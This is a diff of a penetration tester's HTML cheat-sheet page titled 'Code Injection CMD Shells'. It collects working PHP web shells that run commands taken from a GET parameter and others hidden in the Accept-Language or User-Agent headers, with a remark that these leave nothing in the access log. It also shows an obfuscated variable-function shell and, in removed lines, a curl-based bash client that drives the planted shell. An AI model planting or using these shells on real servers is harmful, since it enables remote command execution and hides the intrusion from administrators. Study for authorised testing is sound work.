@@ -2,8 +2,8 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Code Injection</title>
-</head><body>Interesting, if you can inject php, set up a vulnerable variable (cmd in this case) to exploit in browser<br/>
+<title>Code Injection CMD Shells</title>
+</head><body>Interesting, if you can inject php, set up a vulnerable variable (cmd in this case) to exploit in browser. Limited by PHP allowed execution functions. Not limited by all the variables you could use! $_GET, POST, REQUEST, SERVER, FILES, COOKIE Be creative/more stealthy...<br/>
 website.com/vulnpage?cmd=&lt;exec command&gt;<br/>
 <br/>
 &#09;&lt;?php <br/>
@@ -20,8 +20,10 @@ Alternate: <span style="font-family: inherit"><span style="font-size: 10pt">&lt;
 <br/>
 See <a href="nbk:///b3869c62-805d-4d59-8425-8f1253d774f4">PHP &gt; Code Exec Functions</a>&nbsp;for other potential commands to use.<br/>
 <br/>
-<span style="font-size: 10pt"><span style="font-family: inherit">preferred if you want to be noisy: &lt;?php echo shell_exec($_GET['cmd'].' 2&gt;&amp;1'); ?&gt;<br/>
-</span></span><span style="font-size: 10pt"><span style="font-family: inherit">Something more subtle would be:</span></span><br/>
+<span style="font-size: 10pt"><span style="font-family: inherit">preferred if you want to be noisy: <br/>
+</span></span><span style="font-size: 10pt"><span style="font-family: inherit">&lt;?php echo shell_exec($_GET['cmd'].' 2&gt;&amp;1'); ?&gt;</span></span><br/>
+<br/>
+Something more subtle would be:<br/>
 &nbsp;&#09;&lt;?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?&gt;<span style="font-size: 10pt"><span style="font-family: inherit">&nbsp;&#09;&lt;- nothing in access log! Edit Accept-Language header in web proxy</span></span><br/>
 <span style="font-family: inherit"><span style="font-size: 10pt">&nbsp;&#09;or &lt;?php system($_SERVER['HTTP_USER_AGENT'])?&gt;</span></span><br/>
 <br/>
@@ -39,20 +41,5 @@ No need to put function name in the shell:<br/>
 &nbsp; $_($__);<br/>
 ?&gt;<br/>
 <br/>
-<br/>
 SEC560 has more intricate system() shell<br/>
-<br/>
-Advanced cli execution with python: https://github.com/lnxg33k/webhandler<br/>
-<br/>
-Simple bash script for CLI execution (there are others that are probably a lot better, or make your own)<br/>
-#!/bin/bash<br/>
-URL="http://x.x.x.x:yyyy/cmd_shell.php"<br/>
-CMD=`echo ${*} | sed s'/ /%20/g'`<br/>
-CMD=`echo ${CMD} | sed s'/&amp;/%26/g'`<br/>
-CMD=`echo ${CMD} | sed s'/&gt;/%3e/g'`<br/>
-echo ${URL}?cmd=${CMD}<br/>
-curl -s ${URL}?cmd=${CMD}<br/>
-echo ""<br/>
-<br/>
-and execute it:<br/>
-./cmd_inj ls -la</body></html>
+</body></html>
